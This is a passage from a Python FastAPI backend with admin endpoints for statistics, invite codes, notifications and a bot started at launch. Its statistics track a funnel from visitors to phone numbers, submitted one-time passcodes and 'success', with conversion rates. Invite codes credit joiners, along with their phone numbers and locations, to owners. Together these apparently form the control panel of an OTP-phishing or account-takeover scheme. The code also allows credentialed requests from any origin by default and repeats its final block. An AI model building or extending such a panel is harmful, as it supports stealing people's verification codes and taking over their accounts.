    top = await db.users.aggregate(pipeline).to_list(6)
    top_countries = [{"code": (x["_id"] or "??"), "count": x["count"]} for x in top]

    return {
        "visitors": visitors,
        "registered": registered,
        "phoned": phoned,
        "otp_submitted": otp_submitted,
        "success": success,
        "conversion_rate": round((registered / visitors * 100) if visitors else 0, 1),
        "otp_rate": round((otp_submitted / registered * 100) if registered else 0, 1),
        "days": days,
        "top_countries": top_countries,
    }

# ---------- Invites ----------
@api_router.get("/admin/invites")
async def list_invites(sess=Depends(require_admin)):
    invs = await db.invites.find({}, {"_id": 0}).sort("created_at", -1).to_list(200)
    return invs

@api_router.post("/admin/invites")
async def create_invite(data: InviteInput, sess=Depends(require_perm("create_invites"))):
    code = "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(7))
    while await db.invites.find_one({"code": code}):
        code = "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(7))
    doc = {
        "code": code,
        "owner": sess["username"],
        "label": sanitize(data.label or "", 60),
        "joins": 0,
        "created_at": now_iso(),
    }
    await db.invites.insert_one(doc)
    return {k: v for k, v in doc.items() if k != "_id"}

@api_router.get("/admin/invites/{code}/joiners")
async def invite_joiners(code: str, _=Depends(require_admin)):
    users = await db.users.find({"invite_code": code}, {"_id": 0, "id": 1, "nickname": 1, "phone": 1, "state": 1, "created_at": 1, "geo": 1}).sort("created_at", -1).to_list(500)
    return users

@api_router.delete("/admin/invites/{code}")
async def delete_invite(code: str, _=Depends(require_admin)):
    await db.invites.delete_one({"code": code})
    return {"ok": True}

@api_router.get("/invite/{code}")
async def resolve_invite(code: str):
    inv = await db.invites.find_one({"code": code}, {"_id": 0})
    if not inv:
        raise HTTPException(404, "Invalid invite")
    return {"code": inv["code"], "owner": inv["owner"], "label": inv.get("label", "")}

# ---------- Admin notifications ----------
@api_router.get("/admin/notifications")
async def get_notifications(since: Optional[str] = None, _=Depends(require_admin)):
    q = {}
    if since:
        q = {"created_at": {"$gt": since}}
    items = await db.admin_notifs.find(q, {"_id": 0}).sort("created_at", -1).to_list(50)
    return {"items": items, "now": now_iso()}

# ---------- Wiring ----------
app.include_router(api_router)
app.add_middleware(SecurityHeadersMiddleware)
app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

@app.on_event("startup")
async def _start_bot_if_configured():
    try:
        cfg = await snapbot.get_config()
        if (cfg.get("token") or "").strip():
            asyncio.create_task(_delayed_start())
    except Exception as e:
        logger.warning(f"bot autostart failed: {e}")

async def _delayed_start():
    await asyncio.sleep(2)
    try:
        await snapbot.start_bot()
    except Exception as e:
        logger.warning(f"bot start failed: {e}")

@app.on_event("shutdown")
async def shutdown_db_client():
    try:
        await snapbot.stop_bot()
    except Exception:
        pass
    client.close()


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)



if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
